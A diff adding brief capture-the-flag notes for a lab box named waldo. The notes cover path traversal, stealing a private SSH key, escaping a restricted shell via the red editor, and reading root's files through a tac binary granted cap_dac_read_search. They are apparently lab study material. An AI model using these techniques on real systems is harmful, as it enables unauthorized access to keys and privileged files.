@@ -1,0 +1,19 @@
+[+] Path traversal. See: http://10.10.10.87/list.js
+
+[+] Retrieved private SSH key.
+
+[+] Got user.txt!
+
+[+] waldo:~/.ssh$ ssh -i .monitor monitor@waldo
+
+[*] We are in a restricted shell. To break out, use: 
+
+1) Run ./bin/red
+2) Type !/bin/bash 
+4) export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+[+] linpeas.sh showed that /usr/bin/tac = cap_dac_read_search+ei. So:
+
+monitor@waldo:~/app-dev$ tac /root/root.txt
+
+[+] Got root.txt!
